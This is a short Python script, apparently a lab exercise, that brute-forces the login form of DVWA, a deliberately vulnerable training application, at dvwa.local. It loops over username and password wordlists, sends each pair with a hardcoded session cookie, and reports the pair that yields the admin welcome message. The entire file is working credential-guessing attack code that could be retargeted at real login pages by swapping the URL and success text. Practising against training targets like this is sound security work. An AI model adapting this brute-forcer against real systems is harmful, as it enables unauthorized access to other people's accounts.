import requests
from bs4 import BeautifulSoup as Soup


def bruteforce():
    logins = []
    with open("logins.txt", "r") as logins_file:
        logins = logins_file.readlines()
    passwords = []
    with open("passwords.txt", "r") as passwords_file:
        passwords = passwords_file.readlines()

    for login in logins:
        for password in passwords:
            login = login.rstrip('\r\n')
            password = password.rstrip('\r\n')
            param = {
                "username": login,
                "password": password,
                "Login": "Login"
            }
            cookie = {
                "security": "low",
                "PHPSESSID": "16bk96frcqbo9vj99pp8ook5ps"
            }
            response = requests.Session().get("http://dvwa.local/vulnerabilities/brute/index.php", cookies = cookie, params = param).text
            isSuccess = Soup(response, features = "lxml").findAll(text = "Welcome to the password protected area admin")
            if isSuccess:
                print("Success\nlogin: " + login + ", password: " +  password)
                return True
    return False


if __name__ == '__main__':
    done = bruteforce()
    if done == False:
        print("Failed")